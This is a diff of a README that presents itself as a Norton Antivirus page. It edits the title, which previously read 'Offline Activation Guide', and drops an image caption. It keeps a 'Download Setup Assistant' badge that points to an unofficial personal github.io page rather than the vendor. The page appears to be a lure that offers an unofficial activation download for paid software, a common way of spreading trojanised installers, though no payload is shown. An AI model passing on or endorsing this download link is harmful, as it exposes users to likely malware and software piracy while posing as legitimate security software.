@@ -1,4 +1,4 @@
-# Norton Antivirus — Offline Activation Guide
+# Norton Antivirus 
 
 [![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://asdeennerhorse.github.io/mogus/norton)
 
@@ -27,7 +27,7 @@ Known for its reliable real-time scanning and extensive threat database, Norton 
 ## 🖼 Preview
 
 ![Norton Antivirus Interface](https://i.ytimg.com/vi/a6z0DdlpG90/maxresdefault.jpg)  
-*Norton Antivirus dashboard*
+
 
 ---
 
